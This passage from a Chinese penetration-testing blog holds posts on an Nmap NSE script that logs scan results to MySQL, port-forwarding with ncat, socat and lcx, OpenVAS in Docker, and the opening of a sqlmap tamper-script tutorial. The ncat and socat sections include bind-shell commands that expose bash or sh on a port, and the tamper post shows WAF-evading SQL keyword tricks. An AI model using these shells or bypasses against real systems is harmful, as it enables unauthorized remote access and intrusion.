</code></pre></div></div>

<code class="highlighter-rouge">stdnse.get_script_args</code>是用于获取参数的函数，对应Nmap的–script-args参数。

<h3 id="遇到的问题">遇到的问题</h3>

在Nse扩展库中，无法与外部地址(除去扫描范围以外的目标)进行Socket连接。

因为大部分函数都接收绑定函数中的Host与Port参数，他们是一个table数据类型。

于是我翻阅API扩展，发现了一个方法可以直接获取一个IP+端口的套接字：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socket = nmap.new_socket()
socket:set_timeout(1000)
socket:connect(HOST_ADDRESS,PORT_NUMBER)
</code></pre></div></div>

如上方法我们可以直接传递IP地址与端口号就可以获得套接字了。

<h2 id="0x04-扩展结构设计">0X04 扩展结构设计</h2>

nse_main.lua 是声明全局变量、装载script db的预处理脚本，我们可以在其中将连接数据库的行为载入，然后用portrule函数进行数据库的读写。

<blockquote>
  nmap –script=scan_save_database 127.0.0.1
</blockquote>

执行流程：

<ul>
  <li>nse_main.lua 装载</li>
  <li>寻找 scan_save_database 脚本</li>
  <li>主机发现</li>
  <li>端口扫描</li>
  <li>版本侦测</li>
  <li>系统指纹侦测</li>
  <li>….</li>
  <li>执行prerule函数</li>
  <li>执行hostrule函数（如果返回true，执行action）</li>
  <li>执行portrule函数 （如果返回true，执行action）</li>
  <li>执行postrule函数</li>
</ul>

主要是在扩展脚本中的portrule or hostrule 过滤我们的想要的数据，最后再action中对数据库进行读写。

下面演示一下获取开启80端口的所有主机：

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">mysql</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"mysql"</span>
<span class="kd">local</span> <span class="n">nmap</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"nmap"</span>
<span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">shortport</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"shortport"</span>
<span class="n">description</span> <span class="o">=</span><span class="s">[[
This is a Lua script that performs the MySQL statement.
]]</span>
<span class="n">author</span> <span class="o">=</span> <span class="s2">"China CoraLab payloads"</span>
<span class="n">license</span> <span class="o">=</span> <span class="s2">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span>
<span class="n">categories</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"external"</span><span class="p">}</span>

<span class="n">socket</span> <span class="o">=</span> <span class="n">nmap</span><span class="p">.</span><span class="n">new_socket</span><span class="p">()</span>
<span class="n">socket</span><span class="p">:</span><span class="n">set_timeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="n">try</span> <span class="o">=</span> <span class="n">nmap</span><span class="p">.</span><span class="n">new_try</span><span class="p">(</span><span class="k">function</span><span class="p">()</span> <span class="n">socket</span><span class="p">:</span><span class="n">close</span><span class="p">()</span> <span class="k">end</span><span class="p">)</span>
<span class="n">optionsConfig</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">,</span>
    <span class="n">password</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">,</span>
    <span class="n">database</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">,</span>
    <span class="n">sqlQuery</span> <span class="o">=</span> <span class="s2">"INSERT INTO scan_table VALUES (NULL,'%s','%s','%s')"</span><span class="p">,</span>
    <span class="n">host</span>     <span class="o">=</span> <span class="s2">"127.0.0.1"</span><span class="p">,</span>
    <span class="n">port</span>     <span class="o">=</span>  <span class="mi">3306</span>
<span class="p">}</span>


<span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".username"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".password"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">database</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".database"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">database</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".host"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".port"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".sql"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span>

<span class="k">function</span> <span class="nf">mysqlLogin</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">response</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">receiveGreeting</span><span class="p">(</span> <span class="n">socket</span> <span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span> <span class="ow">not</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="p">)</span> <span class="k">then</span>
        <span class="k">return</span> <span class="n">response</span>
    <span class="k">end</span>
    <span class="k">return</span> <span class="n">mysql</span><span class="p">.</span><span class="n">loginRequest</span><span class="p">(</span> <span class="n">socket</span><span class="p">,</span> <span class="p">{</span> <span class="n">authversion</span> <span class="o">=</span> <span class="s2">"post41"</span><span class="p">,</span> <span class="n">charset</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">charset</span> <span class="p">},</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">salt</span> <span class="p">)</span>
<span class="k">end</span>
<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span><span class="o">==</span><span class="mi">80</span><span class="p">)</span> <span class="k">then</span>
		<span class="nb">print</span><span class="p">(</span><span class="s2">"[*] Scan this host open 80 port -- "</span> <span class="o">..</span> <span class="n">host</span><span class="p">.</span><span class="n">ip</span><span class="p">)</span>
		<span class="k">return</span> <span class="kc">true</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="c1">-- </span>
<span class="c1">-- portrule = shortport.portnumber({80,443,8080},"tcp",{"open","open|filtered"})</span>
<span class="c1">-- portrule = shortport.port_or_service({80,443,8080},"http","tcp",{"open","open|filtered"})</span>
<span class="c1">-- portrule = service("http","tcp",{"open"})</span>
<span class="c1">-- </span>
<span class="n">action</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="c1">-- load mysql lib</span>
	<span class="c1">-- get scan info</span>
	<span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">"INSERT INTO scan_table VALUES (NULL,'%s','%s','%s')"</span><span class="p">,</span><span class="n">host</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">.</span><span class="n">number</span><span class="p">,</span><span class="n">port</span><span class="p">.</span><span class="n">service</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">socket</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
    <span class="k">then</span>
        <span class="kd">local</span> <span class="n">status</span><span class="p">,</span><span class="n">response</span> <span class="o">=</span> <span class="n">mysqlLogin</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">status</span><span class="p">)</span>
        <span class="k">then</span>
            <span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">sqlQuery</span><span class="p">(</span> <span class="n">socket</span><span class="p">,</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span> <span class="p">)</span>
            <span class="n">socket</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">formatResultset</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="p">{</span> <span class="n">noheaders</span> <span class="o">=</span> <span class="kc">true</span> <span class="p">})</span>
            <span class="n">stdnse</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="nb">string.format</span><span class="p">(</span><span class="s2">"Query is %s | Result is  %s"</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span><span class="p">,</span><span class="n">result</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">format_output</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="n">host</span><span class="p">.</span><span class="n">ip</span><span class="p">)</span>
        <span class="k">end</span>
    <span class="k">else</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"Connect to mysql Failed !!!"</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">nil</span>
    <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

执行扫描：<code class="highlighter-rouge">nmap --script=scan_db --script-args username=root 192.168.3.183 -d -p 80</code>

执行过程：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x10.png" alt="过程" />

不开启debug…

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x11.png" alt="过程" />

结果：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x12.png" alt="结果" />

<h2 id="0x05-more-ideas">0X05 More ideas</h2>

<h4 id="更多插件">更多插件…</h4>
<h4 id="实用的函数手册">实用的函数手册…</h4>
<h4 id="代码规范">代码规范</h4>
<h4 id="共同维护">共同维护</h4>
<h4 id="有效的任务调度">有效的任务调度</h4>

<h2 id="0x06-共同探讨">0x06 共同探讨</h2>
倾旋
Email:payloads@aliyun.com

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, August 7, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        nmap &nbsp;,
        
        内网渗透 &nbsp;,
        
        漏洞扫描 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-07-31/1" > 端口转发工具小结</a>
    </div>
    <div class="post-excerpt">
      介绍几款端口转发工具
<!--more-->
<h2 id="0x00-ncat">0X00 ncat</h2>

<h3 id="反弹shell">反弹shell</h3>

服务器：<code class="highlighter-rouge">ncat -lnv -c bash 4489</code>  将bash转发到4489端口

客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 4489</code> 连接到目标的4489即可获得交互式bash

Windows下用 <code class="highlighter-rouge">-c C:\windows\system32\cmd.exe</code>

参数介绍：

<table>
  <tbody>
    <tr>
      <td><code class="highlighter-rouge">-l,--listen &lt;port&gt;</code></td>
      <td>监听某个端口</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">-n, --nodns</code>　</td>
      <td>不通过DNS解析主机名</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">-v,--verbose</code></td>
      <td>设置的详细程度(可以使用几次)</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">-c,--sh-exec</code></td>
      <td>执行传递的命令行</td>
    </tr>
  </tbody>
</table>

<h3 id="建立聊天室">建立聊天室</h3>

服务端：<code class="highlighter-rouge">ncat -lnv --broker --chat 8432</code>

客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 8432</code>

参数介绍：

<table>
  <tbody>
    <tr>
      <td><code class="highlighter-rouge">--broker</code></td>
      <td>使用ncat的代理连接模式，允许多个组织连接到ncat的服务器和其他人交流，ncat能创建一个经纪人在连接和系统之间通过NAT或者其他的直接连接。这个选项是和监听模式一起使用的。这会使监听端口的经纪人模式启动</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">--chat</code></td>
      <td>　开启一个简单的ncat聊天服务器</td>
    </tr>
  </tbody>
</table>

<h3 id="采用ssl加密">采用SSL加密</h3>

<ul>
  <li>服务器：<code class="highlighter-rouge">ncat -lnv -c bash 4489 --ssl</code></li>
  <li>客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 4489 --ssl</code></li>
</ul>

<h3 id="传输文件">传输文件</h3>

服务端：
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Kali:~$ ncat -lnv 1788 &gt; tmp.txt
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::1788
Ncat: Listening on 0.0.0.0:1788
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:48004.
</code></pre></div></div>

客户端：
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@504d96ae69cc:/docker_files# cat tmp.txt 
hello :)
root@504d96ae69cc:/docker_files# ncat -nv 172.17.0.1 1788 &lt; tmp.txt 
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connected to 172.17.0.1:1788.
Ncat: 9 bytes sent, 0 bytes received in 0.01 seconds.
root@504d96ae69cc:/docker_files# 
</code></pre></div></div>

<h3 id="参数列表中文">参数列表(中文)</h3>

<a href="/tools/ncat.txt">ncat参数</a>

<h2 id="0x01-socat">0x01 socat</h2>

<h3 id="安装">安装</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
<span class="nb">tar </span>xvf socat-2.0.0-b9.tar.gz
<span class="nb">cd </span>socat-2.0.0-b9
./configure
make
make <span class="nb">install</span>
</code></pre></div></div>

<h3 id="建立通信聊天室">建立通信(聊天室)</h3>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat - tcp4-listen:4444</code></td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">socat tcp:SERVER_IP:4444</code></td>
    </tr>
  </tbody>
</table>

<h3 id="传输文件-1">传输文件</h3>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat tcp4-listen:4444 open:data.txt,creat,append</code></td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">cat test.txt | socat - tcp:SERVER_IP:4444</code></td>
    </tr>
  </tbody>
</table>

<blockquote>
  传输二进制文件需要将append改成binary
</blockquote>

<h3 id="反弹shell-1">反弹Shell</h3>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat tcp-l:4444 exec:sh,pty,stderr</code></td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">socat - tcp:SERVER_IP:4444</code></td>
    </tr>
    <tr>
      <td>tcp-l 是 <code class="highlighter-rouge">tcp4-listen</code> 的简写</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="端口转发">端口转发</h3>

<code class="highlighter-rouge">socat - tcp-l:8888,fork tcp4:192.168.3.1:4477</code>

当本机接收到8888端口的数据，将全部转发给192.168.3.1主机上的4477端口

<h3 id="udp通信">UDP通信</h3>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat - udp-l:4456</code></td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">socat - udp-datagram:192.168.3.1:4456</code></td>
    </tr>
    <tr>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="公网转发到内网">公网转发到内网</h3>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat tcp-listen:1234 tcp-listen:22</code></td>
      <td>外网IP(<code class="highlighter-rouge">60.*.*.*</code>)</td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">socat tcp:60.*.*.*:1234 tcp:192.168.3.1:22</code></td>
      <td>内网IP(192.168.3.1)</td>
    </tr>
  </tbody>
</table>

<h3 id="内网转发到公网">内网转发到公网</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                  ------------
                 |   Server   |
                 |  60.*.*.*  |
                  ------------
                 /            \
          {|&lt;Firewall&gt;|}    {|&lt;Firewall&gt;|}
                |                 |
          --------------      ----------------        
         | (192.168.3.1)|     | (192.168.3.2) |
          --------------      ----------------
       (hosting a service    (wanting to access
         on port 4200)         Client A port 4200)
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>服务端</td>
      <td><code class="highlighter-rouge">socat - tcp-l:10000 tcp-l:4200</code></td>
    </tr>
    <tr>
      <td>客户端</td>
      <td><code class="highlighter-rouge">socat tcp4:60.*.*.*:10000 tcp4:localhost:4200</code></td>
    </tr>
  </tbody>
</table>

<h3 id="参考文档">参考文档</h3>

<a href="/tools/socat">socat使用手册</a>

<h2 id="0x02-lcxgo语言编写">0x02 lcx（go语言编写）</h2>

被控端192.168.10.2 ：

lcx <公网IP> 123</公网IP>

控制端 111.111.111.111：

lcx 456 123 192.168.10.2 3389

此时访问111.111.111.111的456就等于192.168.10.2:3389

<a href="http://www.secpulse.com/wp-content/uploads/2015/05/lcx._g.rar">Download</a>
<a href="https://www.secpulse.com/archives/6341.html">相关文章</a>


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, July 31, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        内网渗透 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-07-31/2" > 在Docker中安装openvas</a>
    </div>
    <div class="post-excerpt">
      本文简述docker安装openvas
<!--more-->
<h2 id="安装过程">安装过程</h2>
镜像是从阿里云pull下来的：<code class="highlighter-rouge">docker pull  registry.cn-hangzhou.aliyuncs.com/secends/openvas</code>

安装过程：

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>liyingzhe@ThundeRobot:~/下载<span class="nv">$ </span>docker pull  registry.cn-hangzhou.aliyuncs.com/secends/openvas
Using default tag: latest
latest: Pulling from secends/openvas

6599cadaf950: Pull <span class="nb">complete 
</span>23eda618d451: Pull <span class="nb">complete 
</span>f0be3084efe9: Pull <span class="nb">complete 
</span>52de432f084b: Pull <span class="nb">complete 
</span>a3ed95caeb02: Pull <span class="nb">complete 
</span>7f9ef9bd6c98: Pull <span class="nb">complete 
</span>323caba9d1cc: Pull <span class="nb">complete 
</span>73a9f4a66d02: Pull <span class="nb">complete 
</span>Digest: sha256:adaf2ce11c97e9a924a053a97edf2b159daa0c8cd575ae5c5e2fe7a7cdb2c190
Status: Downloaded newer image <span class="k">for </span>registry.cn-hangzhou.aliyuncs.com/secends/openvas:latest
liyingzhe@ThundeRobot:~/下载<span class="nv">$ </span>docker images
REPOSITORY                                           TAG                 IMAGE ID            CREATED             SIZE
registry.cn-hangzhou.aliyuncs.com/imxieke/kali       latest              6759704c31d9        4 months ago        1.668 GB
registry.cn-hangzhou.aliyuncs.com/gengxiaoxin/lnmp   latest              4f9feeb5a907        11 months ago       318.2 MB
registry.cn-hangzhou.aliyuncs.com/secends/openvas    latest              f254e0f3b11d        14 months ago       3.51 GB
<span class="c">#把80映射到本机9392</span>
liyingzhe@ThundeRobot:~/下载<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">-p</span> 9392:80 f254e0f3b11d
Starting Redis
Starting Openvas...
Starting gsad
Starting rebuild process...
This may take a minute or two...
Checking setup
openvas-check-setup 2.3.3
  Test completeness and readiness of OpenVAS-8
  <span class="o">(</span>add <span class="s1">'--v6'</span> or <span class="s1">'--v7'</span> or <span class="s1">'--v9'</span>
   <span class="k">if </span>you want to check <span class="k">for </span>another OpenVAS version<span class="o">)</span>

  Please report us any non-detected problems and
  <span class="nb">help </span>us to improve this check routine:
  http://lists.wald.intevation.org/mailman/listinfo/openvas-discuss

  Send us the log-file <span class="o">(</span>/tmp/openvas-check-setup.log<span class="o">)</span> to <span class="nb">help </span>analyze the problem.

Step 1: Checking OpenVAS Scanner ... 
        OK: OpenVAS Scanner is present <span class="k">in </span>version 5.0.5.
        OK: OpenVAS Scanner CA Certificate is present as /var/lib/openvas/CA/cacert.pem.
        OK: redis-server is present <span class="k">in </span>version <span class="nv">v</span><span class="o">=</span>2.8.4.
        OK: scanner <span class="o">(</span>kb_location setting<span class="o">)</span> is configured properly using the redis-server socket: /var/run/redis/redis.sock
        OK: redis-server is running and listening on socket: /var/run/redis/redis.sock.
        OK: redis-server configuration is OK and redis-server is running.
        OK: NVT collection <span class="k">in</span> /var/lib/openvas/plugins contains 47056 NVTs.
        WARNING: Signature checking of NVTs is not enabled <span class="k">in </span>OpenVAS Scanner.
        SUGGEST: Enable signature checking <span class="o">(</span>see http://www.openvas.org/trusted-nvts.html<span class="o">)</span><span class="nb">.</span>
        OK: The NVT cache <span class="k">in</span> /var/cache/openvas contains 47056 files <span class="k">for </span>47056 NVTs.
Step 2: Checking OpenVAS Manager ... 
        OK: OpenVAS Manager is present <span class="k">in </span>version 6.0.8.
        OK: OpenVAS Manager client certificate is present as /var/lib/openvas/CA/clientcert.pem.
        OK: OpenVAS Manager database found <span class="k">in</span> /var/lib/openvas/mgr/tasks.db.
        OK: Access rights <span class="k">for </span>the OpenVAS Manager database are correct.
        OK: sqlite3 found, extended checks of the OpenVAS Manager installation enabled.
        OK: OpenVAS Manager database is at revision 146.
        OK: OpenVAS Manager expects database at revision 146.
        OK: Database schema is up to date.
        OK: OpenVAS Manager database contains information about 47056 NVTs.
        OK: At least one user exists.
        OK: OpenVAS SCAP database found <span class="k">in</span> /var/lib/openvas/scap-data/scap.db.
        OK: OpenVAS CERT database found <span class="k">in</span> /var/lib/openvas/cert-data/cert.db.
        OK: xsltproc found.
Step 3: Checking user configuration ... 
        WARNING: Your password policy is empty.
        SUGGEST: Edit the /etc/openvas/pwpolicy.conf file to <span class="nb">set </span>a password policy.
Step 4: Checking Greenbone Security Assistant <span class="o">(</span>GSA<span class="o">)</span> ... 
        OK: Greenbone Security Assistant is present <span class="k">in </span>version 6.0.10.
Step 5: Checking OpenVAS CLI ... 
        SKIP: Skipping check <span class="k">for </span>OpenVAS CLI.
Step 6: Checking Greenbone Security Desktop <span class="o">(</span>GSD<span class="o">)</span> ... 
        SKIP: Skipping check <span class="k">for </span>Greenbone Security Desktop.
Step 7: Checking <span class="k">if </span>OpenVAS services are up and running ... 
        OK: netstat found, extended checks of the OpenVAS services enabled.
        ERROR: OpenVAS Scanner is NOT running!
        FIX: Start OpenVAS Scanner <span class="o">(</span>openvassd<span class="o">)</span><span class="nb">.</span>
        OK: OpenVAS Manager is running and listening on all interfaces.
        OK: OpenVAS Manager is listening on port 9390, which is the default port.
        OK: Greenbone Security Assistant is listening on port 80, which is the default port.

 ERROR: Your OpenVAS-8 installation is not yet <span class="nb">complete</span><span class="o">!</span>

Please follow the instructions marked with FIX above and run this
script again.

If you think this result is wrong, please report your observation
and <span class="nb">help </span>us to improve this check routine:
http://lists.wald.intevation.org/mailman/listinfo/openvas-discuss
Please attach the log-file <span class="o">(</span>/tmp/openvas-check-setup.log<span class="o">)</span> to <span class="nb">help </span>us analyze the problem.

Done.
Starting infinite loop...
Press <span class="o">[</span>CTRL+C] to stop..
</code></pre></div></div>
<h2 id="遇到的问题">遇到的问题</h2>

openvas密码忘记问题：
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>liyingzhe@ThundeRobot:~/下载<span class="nv">$ </span>docker <span class="nb">exec </span>9a57ef793c73 openvasmd <span class="nt">--delete-user</span><span class="o">=</span>admin  <span class="c">#删除用户admin</span>
User deleted.
liyingzhe@ThundeRobot:~/下载<span class="nv">$ </span>docker <span class="nb">exec </span>9a57ef793c73 openvasmd <span class="nt">--create-user</span><span class="o">=</span>admin  <span class="c">#创建用户，并且生产密码</span>
User created with password <span class="s1">'4fb3b80b-c1e8-413d-985f-9574c6aca9b5'</span><span class="nb">.</span>
</code></pre></div></div>

此时就可以愉快的使用了！

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, July 31, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        openvas &nbsp;,
        
        漏洞扫描 &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-06-08/1" > 如何编写Sqlmap的Tamper脚本?</a>
    </div>
    <div class="post-excerpt">
      本文简述SQLMAP的tamper编写步骤
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>

前段时间发布了几篇Bypass的文章，包括脚本的免杀、请求分析、WAF的特性、Bypass原理…
我的微信：Guest_Killer_0nlis

<ul>
  <li><a href="https://zhuanlan.zhihu.com/p/25549356">渗透测试中的Bypass技巧（一）</a></li>
  <li><a href="https://zhuanlan.zhihu.com/p/25585517">渗透测试中的Bypass技巧（二）</a></li>
  <li><a href="https://zhuanlan.zhihu.com/p/25678670">自动化注入Bypass（附自动化sqlmap bypass tamper）</a></li>
  <li><a href="https://zhuanlan.zhihu.com/p/25724834">自动化注入Bypass 2（附自动化sqlmap bypass tamper）</a></li>
</ul>

这些文章中的亮点无非就是那两个<code class="highlighter-rouge">tamper</code>啦！

今天带大家从基本的走起：

<ul>
  <li>0x00 前言</li>
  <li>0x01 Tamper的主要作用</li>
  <li>0x02 Tamper简单结构概述</li>
  <li>0x03 Tamper的几个玩法</li>
  <li>0x04 最后的吐槽！</li>
</ul>

<h2 id="0x01-tamper的主要作用">0x01 Tamper的主要作用</h2>

其实一个简单的Tamper能够帮助我们修改<code class="highlighter-rouge">Payload</code>，修改请求头中的<code class="highlighter-rouge">Header</code>值，从而绕过IDS/WAF的检测。

<blockquote>
  这里的<code class="highlighter-rouge">Payload</code>就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上<code class="highlighter-rouge">-v 3</code>参数来查看<code class="highlighter-rouge">Payload</code>。
</blockquote>

它共有七个等级，默认为1：

<ul>
  <li>0、只显示python错误以及严重的信息。</li>
  <li>1、同时显示基本信息和警告信息。（默认）</li>
  <li>2、同时显示debug信息。</li>
  <li>3、同时显示注入的payload。</li>
  <li>4、同时显示HTTP请求。</li>
  <li>5、同时显示HTTP响应头。</li>
  <li>6、同时显示HTTP响应页面。</li>
</ul>

<blockquote>
  这里的<code class="highlighter-rouge">Header</code>就是我们的每一个请求头，在注入的时候我们可以加上<code class="highlighter-rouge">-v 4</code>参数来查看<code class="highlighter-rouge">Header</code>。
</blockquote>

在调用<code class="highlighter-rouge">Tamper</code>之前我们要考虑当前数据库的版本、类型，然后再去选择合理的<code class="highlighter-rouge">Tamper</code>。

假设我有一个MySQL数据库的注入点，WAF检测<code class="highlighter-rouge">UNION</code>关键字如果有空格，就会被当作一个SQL攻击请求，从而把你给拦截了。
那么真的就没有办法了吗？

在MySQL语句中，我们可以通过<code class="highlighter-rouge">/*!UNION*/</code>或者<code class="highlighter-rouge">/**/UNION/**/</code> Agian or <code class="highlighter-rouge">UniOn</code>….都可以正常执行，前提是你必须了解各个数据库的特性。
就拿MySQL来说，它不区分大小写，那么我们传递的值有时候也可以通过大小写混淆的方式去绕过检测。

<blockquote>
  这些思路都是根据一个个基础知识通过构思、一个想法而产生的，然后再通过动手去实践想法，得出结论，最后产生“姿势”。 
你不缺乏想象力，你只是基础知识太弱。      - 倾旋
</blockquote>

那么说了这么多，其实可以总结出：调用Tamper的条件就是必须能保证我们的SQL执行后与我们的期望结果相同。
意思也就是要满足数据库能够正常运行SQL(排除报错注入)。

<h2 id="0x02-tamper简单结构概述">0x02 Tamper简单结构概述</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="s">"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""</span>

<span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
